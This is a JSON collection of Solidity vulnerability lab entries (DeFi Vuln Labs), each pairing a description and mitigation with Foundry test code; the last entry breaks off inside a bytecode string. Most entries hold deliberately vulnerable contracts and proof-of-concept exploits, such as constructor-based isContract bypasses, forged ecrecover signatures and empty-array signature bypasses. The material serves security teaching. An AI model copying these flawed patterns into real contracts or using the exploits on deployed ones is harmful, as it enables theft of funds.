[
  {
    "id": "hash-collisions",
    "slug": "hash-collisions",
    "title": "abi.encodePacked() Hash Collisions",
    "description": "Using abi.encodePacked() with multiple variable length arguments can, \nin certain situations, lead to a hash collision.\n\nHash functions are designed to be unique for each input, \nbut collisions can still occur due to limitations in the hash function's size or the sheer number of possible inputs. \nThis is a known issue mentioned:\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\n\nIn deposit function allows users to deposit Ether into the contract based on two string inputs: _string1 and _string2. \nThe contract uses the keccak256 function to generate a unique hash by concatenating these two strings.\n\nIf two different combinations of _string1 and _string2 produce the same hash value, a hash collision will occur. \nThe code does not handle this scenario properly and allows the second depositor to overwrite the previous deposit.",
    "mitigation": "use of abi.encode() instead of abi.encodePacked()\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676476475191750656\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\nhttps://swcregistry.io/docs/SWC-133\nhttps://github.com/sherlock-audit/2022-10-nftport-judging/issues/118",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: abi.encodePacked() Hash Collisions\n\nDescription:\nUsing abi.encodePacked() with multiple variable length arguments can, \nin certain situations, lead to a hash collision.\n\nHash functions are designed to be unique for each input, \nbut collisions can still occur due to limitations in the hash function's size or the sheer number of possible inputs. \nThis is a known issue mentioned:\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\n\nIn deposit function allows users to deposit Ether into the contract based on two string inputs: _string1 and _string2. \nThe contract uses the keccak256 function to generate a unique hash by concatenating these two strings.\n\nIf two different combinations of _string1 and _string2 produce the same hash value, a hash collision will occur. \nThe code does not handle this scenario properly and allows the second depositor to overwrite the previous deposit.\n\nMitigation: \nuse of abi.encode() instead of abi.encodePacked()\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676476475191750656\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\nhttps://swcregistry.io/docs/SWC-133\nhttps://github.com/sherlock-audit/2022-10-nftport-judging/issues/118\n*/\n\ncontract ContractTest is Test {\n    HashCollisionBug HashCollisionBugContract;\n\n    function setUp() public {\n        HashCollisionBugContract = new HashCollisionBug();\n    }\n\n    function testHash_collisions() public {\n        emit log_named_bytes32(\n            \"(AAA,BBB) Hash\",\n            HashCollisionBugContract.createHash(\"AAA\", \"BBB\")\n        );\n        HashCollisionBugContract.deposit{value: 1 ether}(\"AAA\", \"BBB\");\n\n        emit log_named_bytes32(\n            \"(AA,ABBB) Hash\",\n            HashCollisionBugContract.createHash(\"AA\", \"ABBB\")\n        );\n        vm.expectRevert(\"Hash collision detected\");\n        HashCollisionBugContract.deposit{value: 1 ether}(\"AA\", \"ABBB\"); //Hash collision detected\n    }\n\n    receive() external payable {}\n}\n\ncontract HashCollisionBug {\n    mapping(bytes32 => uint256) public balances;\n\n    function createHash(\n        string memory _string1,\n        string memory _string2\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_string1, _string2));\n    }\n\n    function deposit(\n        string memory _string1,\n        string memory _string2\n    ) external payable {\n        require(msg.value > 0, \"Deposit amount must be greater than zero\");\n\n        bytes32 hash = createHash(_string1, _string2);\n        // createHash(AAA, BBB) -> AAABBB\n        // createHash(AA, ABBB) -> AAABBB\n        // Check if the hash already exists in the balances mapping\n        require(balances[hash] == 0, \"Hash collision detected\");\n\n        balances[hash] = msg.value;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "SWC-133",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Hash-collisions.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "array-deletion",
    "slug": "array-deletion",
    "title": "Array Deletion Oversight: leading to data inconsistency",
    "description": "In Solidity where improper deletion of elements from dynamic arrays can result in data inconsistency. \nWhen attempting to delete elements from an array, if the deletion process is not handled correctly, \nthe array may still retain storage space and exhibit unexpected behavior.",
    "mitigation": "Option1: By copying the last element and placing it in the position to be removed.\nOption2: By shifting them from right to left.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1677167550277509120\nhttps://blog.solidityscan.com/improper-array-deletion-82672eed8e8d\nhttps://github.com/sherlock-audit/2023-03-teller-judging/issues/88",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Array Deletion Oversight: leading to data inconsistency\n\nDescription:\nIn Solidity where improper deletion of elements from dynamic arrays can result in data inconsistency. \nWhen attempting to delete elements from an array, if the deletion process is not handled correctly, \nthe array may still retain storage space and exhibit unexpected behavior. \n\n\nMitigation:  \nOption1: By copying the last element and placing it in the position to be removed.\nOption2: By shifting them from right to left.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1677167550277509120\nhttps://blog.solidityscan.com/improper-array-deletion-82672eed8e8d\nhttps://github.com/sherlock-audit/2023-03-teller-judging/issues/88\n*/\n\ncontract ContractTest is Test {\n    ArrayDeletionBug ArrayDeletionBugContract;\n    FixedArrayDeletion FixedArrayDeletionContract;\n\n    function setUp() public {\n        ArrayDeletionBugContract = new ArrayDeletionBug();\n        FixedArrayDeletionContract = new FixedArrayDeletion();\n    }\n\n    function testArrayDeletion() public {\n        ArrayDeletionBugContract.myArray(1);\n        //delete incorrectly\n        ArrayDeletionBugContract.deleteElement(1);\n        ArrayDeletionBugContract.myArray(1);\n        ArrayDeletionBugContract.getLength();\n    }\n\n    function testFixedArrayDeletion() public {\n        FixedArrayDeletionContract.myArray(1);\n        //delete incorrectly\n        FixedArrayDeletionContract.deleteElement(1);\n        FixedArrayDeletionContract.myArray(1);\n        FixedArrayDeletionContract.getLength();\n    }\n\n    receive() external payable {}\n}\n\ncontract ArrayDeletionBug {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        delete myArray[index];\n    }\n\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n\ncontract FixedArrayDeletion {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    //Mitigation 1: By copying the last element and placing it in the position to be removed.\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n\n        // Swap the element to be deleted with the last element\n        myArray[index] = myArray[myArray.length - 1];\n\n        // Delete the last element\n        myArray.pop();\n    }\n\n    /*Mitigation 2: By shifting them from right to left.\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        \n        for (uint i = _index; i < myArray.length - 1; i++) {\n            myArray[i] = myArray[i + 1];\n        }\n        \n        // Delete the last element\n        myArray.pop();\n    }\n    */\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Array-deletion.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "bypasscontract",
    "slug": "bypasscontract",
    "title": "Bypass isContract() validation",
    "description": "The attacker only needs to write the code in the constructor of the smart contract \nto bypass the detection mechanism of whether it is a smart contract.\n\nREF:\nhttps://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Bypass isContract() validation\n\nDescription:\nThe attacker only needs to write the code in the constructor of the smart contract \nto bypass the detection mechanism of whether it is a smart contract.\n\nREF:\nhttps://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/\n*/\n\ncontract ContractTest is Test {\n    Target TargetContract;\n    FailedAttack FailedAttackContract;\n    Attack AttackerContract;\n    TargetRemediated TargetRemediatedContract;\n\n    constructor() {\n        TargetContract = new Target();\n        FailedAttackContract = new FailedAttack();\n        TargetRemediatedContract = new TargetRemediated();\n    }\n\n    function testBypassFailedContractCheck() public {\n        console.log(\n            \"Before exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        console.log(\"Exploit Failed\");\n        FailedAttackContract.pwn(address(TargetContract));\n    }\n\n    function testBypassContractCheck() public {\n        console.log(\n            \"Before exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        AttackerContract = new Attack(address(TargetContract));\n        console.log(\n            \"After exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Target {\n    function isContract(address account) public view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n\ncontract FailedAttack is Test {\n    // Attempting to call Target.protected will fail,\n    // Target block calls from contract\n    function pwn(address _target) external {\n        // This will fail\n        vm.expectRevert(\"no contract allowed\");\n        Target(_target).protected();\n    }\n}\n\ncontract Attack {\n    bool public isContract;\n    address public addr;\n\n    // When contract is being created, code size (extcodesize) is 0.\n    // This will bypass the isContract() check\n    constructor(address _target) {\n        isContract = Target(_target).isContract(address(this));\n        addr = address(this);\n        // This will work\n        Target(_target).protected();\n    }\n}\n\ncontract TargetRemediated {\n    function isContract(address account) public view returns (bool) {\n        require(tx.origin == msg.sender);\n        return account.code.length > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Bypasscontract.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "data-location",
    "slug": "data-location",
    "title": "Data Location Confusion Vulnerability",
    "description": "Misuse of storage and memory references of the user in the updaterewardDebt function.\n\nThe function updaterewardDebt is updating the rewardDebt value of a UserInfo struct \nthat is stored in memory. The issue is that this won't persist between function calls. \nAs soon as the function finishes executing, the memory is cleared and the changes are lost.",
    "mitigation": "Ensure the correct usage of memory and storage in the function parameters. Make all the locations explicit.\n\nREF:\nhttps://mudit.blog/cover-protocol-hack-analysis-tokens-minted-exploit/\nhttps://www.educative.io/answers/storage-vs-memory-in-solidity",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Data Location Confusion Vulnerability\n\nDescription:\nMisuse of storage and memory references of the user in the updaterewardDebt function.\n\nThe function updaterewardDebt is updating the rewardDebt value of a UserInfo struct \nthat is stored in memory. The issue is that this won't persist between function calls. \nAs soon as the function finishes executing, the memory is cleared and the changes are lost.\n\nMitigation:\nEnsure the correct usage of memory and storage in the function parameters. Make all the locations explicit.\n\nREF:\nhttps://mudit.blog/cover-protocol-hack-analysis-tokens-minted-exploit/\nhttps://www.educative.io/answers/storage-vs-memory-in-solidity\n\n*/\n\ncontract ContractTest is Test {\n    Array ArrayContract;\n\n    function testDataLocation() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.deal(address(bob), 1 ether);\n        //vm.startPrank(alice);\n        ArrayContract = new Array();\n        ArrayContract.updaterewardDebt(100); // update rewardDebt to 100\n        (uint amount, uint rewardDebt) = ArrayContract.userInfo(address(this));\n        console.log(\"Non-updated rewardDebt\", rewardDebt);\n\n        console.log(\"Update rewardDebt with storage\");\n        ArrayContract.fixedupdaterewardDebt(100);\n        (uint newamount, uint newrewardDebt) = ArrayContract.userInfo(\n            address(this)\n        );\n        console.log(\"Updated rewardDebt\", newrewardDebt);\n    }\n\n    receive() external payable {}\n}\n\ncontract Array is Test {\n    mapping(address => UserInfo) public userInfo; // storage\n\n    struct UserInfo {\n        uint256 amount; // How many tokens got staked by user.\n        uint256 rewardDebt; // Reward debt. See Explanation below.\n    }\n\n    function updaterewardDebt(uint amount) public {\n        UserInfo memory user = userInfo[msg.sender]; // memory, vulnerable point\n        user.rewardDebt = amount;\n    }\n\n    function fixedupdaterewardDebt(uint amount) public {\n        UserInfo storage user = userInfo[msg.sender]; // storage\n        user.rewardDebt = amount;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/DataLocation.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "dos",
    "slug": "dos",
    "title": "Denial of Service",
    "description": "The KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. \nThe contract attempts to return the previous balance to the last \"king\" when a new user sends more Ether. However,\nthis mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king \nand then make the fallback function revert or consume more than the stipulated gas limit, \ncausing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king.",
    "mitigation": "Use a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.\n\nREF:\nhttps://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Denial of Service\n\nDescription:\nThe KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. \nThe contract attempts to return the previous balance to the last \"king\" when a new user sends more Ether. However,\nthis mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king \nand then make the fallback function revert or consume more than the stipulated gas limit, \ncausing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king. \n\nMitigation:\nUse a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.\n\nREF:\nhttps://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26\n*/\n\ncontract ContractTest is Test {\n    KingOfEther KingOfEtherContract;\n    Attack AttackerContract;\n\n    function setUp() public {\n        KingOfEtherContract = new KingOfEther();\n        AttackerContract = new Attack(KingOfEtherContract);\n    }\n\n    function testDOS() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 4 ether);\n        vm.deal(address(bob), 2 ether);\n        vm.prank(alice);\n        KingOfEtherContract.claimThrone{value: 1 ether}();\n        vm.prank(bob);\n        KingOfEtherContract.claimThrone{value: 2 ether}();\n        console.log(\n            \"Return 1 ETH to Alice, Alice of balance\",\n            address(alice).balance\n        );\n        AttackerContract.attack{value: 3 ether}();\n\n        console.log(\n            \"Balance of KingOfEtherContract\",\n            KingOfEtherContract.balance()\n        );\n        console.log(\"Attack completed, Alice claimthrone again, she will fail\");\n        vm.prank(alice);\n        vm.expectRevert(\"Failed to send Ether\");\n        KingOfEtherContract.claimThrone{value: 4 ether}();\n    }\n\n    receive() external payable {}\n}\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n",
    "severity": "Medium",
    "category": "DoS",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/DOS.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "dirtybytes",
    "slug": "dirtybytes",
    "title": "Dirtybytes in > Solidity 0.8.15",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n// the issue is fixed in 0.8.15\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Dirtybytes in > Solidity 0.8.15\n    \"description\": \"Copying ``bytes`` arrays from memory or calldata to storage is done in chunks of 32 bytes even if the length is not a multiple of 32. \n    Thereby, extra bytes past the end of the array may be copied from calldata or memory to storage. \n    These dirty bytes may then become observable after a ``.push()`` without arguments to the bytes array in storage,\n    i.e. such a push will not result in a zero value at the end of the array as expected. \n    This bug only affects the legacy code generation pipeline, the new code generation pipeline via IR is not affected.\"\n    \n    \"link\": https://blog.soliditylang.org/2022/06/15/dirty-bytes-array-to-storage-bug/\n    \"fixed\": 0.8.15\n\n*/\n\ncontract ContractTest is Test {\n    Dirtybytes Dirtybytesontract;\n\n    function testDirtybytes() public {\n        Dirtybytesontract = new Dirtybytes();\n        emit log_named_bytes(\n            \"Array element in h() not being zero::\",\n            Dirtybytesontract.h()\n        );\n        console.log(\n            \"Such that the byte after the 63 bytes allocated below will be 0x02.\"\n        );\n    }\n}\n\ncontract Dirtybytes {\n    event ev(uint[], uint);\n    bytes s;\n\n    constructor() {\n        // The following event emission involves writing to temporary memory at the current location\n        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will\n        // use temporary memory in a similar manner.\n        // In this particular case, the length of the passed array will be written to temporary memory\n        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte\n        // will then be written to storage during the assignment and become visible with the push in ``h``.\n        emit ev(new uint[](2), 0);\n        bytes memory m = new bytes(63);\n        s = m;\n    }\n\n    function h() external returns (bytes memory) {\n        s.push();\n        return s;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Dirtybytes.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "ecrecover",
    "slug": "ecrecover",
    "title": "ecrecover returns address(0)",
    "description": "In the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.\nIt recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact \nthat the ecrecover function may return a 0x0 address when the signature parameters \nare invali, If v value isn't 27 or 28. it will return address(0).",
    "mitigation": "Verify that the result from ecrecover isn't 0 or instead use OpenZeppelin’s ECDSA library.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1674268926761668608\nhttps://github.com/code-423n4/2021-09-swivel-findings/issues/61\nhttps://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: ecrecover returns address(0)\n\nDescription:\nIn the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.\nIt recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact \nthat the ecrecover function may return a 0x0 address when the signature parameters \nare invali, If v value isn't 27 or 28. it will return address(0).\n\nMitigation:  \nVerify that the result from ecrecover isn't 0 or instead use OpenZeppelin’s ECDSA library.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1674268926761668608\nhttps://github.com/code-423n4/2021-09-swivel-findings/issues/61\nhttps://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n    }\n\n    function testecRecover() public {\n        emit log_named_decimal_uint(\n            \"Before exploiting, my balance\",\n            SimpleBankContract.getBalance(address(this)),\n            18\n        );\n        bytes32 _hash = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\")\n        );\n        (, bytes32 r, bytes32 s) = vm.sign(1, _hash);\n\n        // If v value isn't 27 or 28. it will return address(0)\n        uint8 v = 29;\n        SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);\n\n        emit log_named_decimal_uint(\n            \"After exploiting, my balance\",\n            SimpleBankContract.getBalance(address(this)),\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint256) private balances;\n    address Admin; //default is address(0)\n\n    function getBalance(address _account) public view returns (uint256) {\n        return balances[_account];\n    }\n\n    function recoverSignerAddress(\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) private pure returns (address) {\n        address recoveredAddress = ecrecover(_hash, _v, _r, _s);\n        return recoveredAddress;\n    }\n\n    function transfer(\n        address _to,\n        uint256 _amount,\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public {\n        require(_to != address(0), \"Invalid recipient address\");\n\n        address signer = recoverSignerAddress(_hash, _v, _r, _s);\n        console.log(\"signer\", signer);\n        //Mitigation\n        //require(signer != address(0), \"Invalid signature\");\n        require(signer == Admin, \"Invalid signature\");\n\n        balances[_to] += _amount;\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ecrecover.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "empty-loop",
    "slug": "empty-loop",
    "title": "Empty loop issue",
    "description": "Due to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.",
    "mitigation": "Check the number of signatures  \nrequire(sigs.length > 0, \"No signatures provided\");\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673195574215213057\nhttps://twitter.com/akshaysrivastv/status/1648310441058115592\nhttps://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: Empty loop issue\n\nDescription:\nDue to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.\n\nMitigation:  \nCheck the number of signatures  \nrequire(sigs.length > 0, \"No signatures provided\");\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673195574215213057\nhttps://twitter.com/akshaysrivastv/status/1648310441058115592\nhttps://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs\n*/\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n    }\n\n    function testVulnSignatureValidation() public {\n        payable(address(SimpleBankContract)).transfer(10 ether);\n        address alice = vm.addr(1);\n        vm.startPrank(alice);\n\n        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input\n        //sigs[0] = SimpleBank.Signature(\"\", 0, \"\", \"\");\n\n        console.log(\n            \"Before exploiting, Alice's ether balance\",\n            address(alice).balance\n        );\n        SimpleBankContract.withdraw(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter\n\n        console.log(\n            \"Afer exploiting, Alice's ether balance\",\n            address(alice).balance\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    struct Signature {\n        bytes32 hash;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\n    function verifySignatures(Signature calldata sig) public {\n        require(\n            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),\n            \"Invalid signature\"\n        );\n    }\n\n    function withdraw(Signature[] calldata sigs) public {\n        // Mitigation: Check the number of signatures\n        //require(sigs.length > 0, \"No signatures provided\");\n        for (uint i = 0; i < sigs.length; i++) {\n            Signature calldata signature = sigs[i];\n            // Verify every signature and revert if any of them fails to verify.\n            verifySignatures(signature);\n        }\n        payable(msg.sender).transfer(1 ether);\n    }\n\n    receive() external payable {}\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/empty-loop.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "erc777-reentrancy",
    "slug": "erc777-reentrancy",
    "title": "ERC777 Reentrancy Vulnerability",
    "description": "ERC777 tokens allow arbitrary callbacks via hooks that are called during token transfers.\nMalicious contract addresses may cause reentrancy on such callbacks if reentrancy guards are not used.",
    "mitigation": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC777/ERC777.sol\";\n\n/*\nName: ERC777 Reentrancy Vulnerability\n\nDescription:\nERC777 tokens allow arbitrary callbacks via hooks that are called during token transfers.\nMalicious contract addresses may cause reentrancy on such callbacks if reentrancy guards are not used. \n\nScenario:\nMaximum claims is 1,000 for each EOA, How can you bypass this limitation?\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5\n\n*/\n\ncontract ContractTest is Test {\n    MyERC777 MyERC777TokenContract;\n    SimpleBank SimpleBankContract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH =\n        keccak256(\"ERC777TokensSender\");\n    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =\n        keccak256(\"ERC777TokensRecipient\");\n\n    function setUp() external {\n        // mock ERC1820Registry contract in foundry\n        vm.etch(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),\n            bytes(\n                hex\"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a03908116600090815260208181526040808320868452909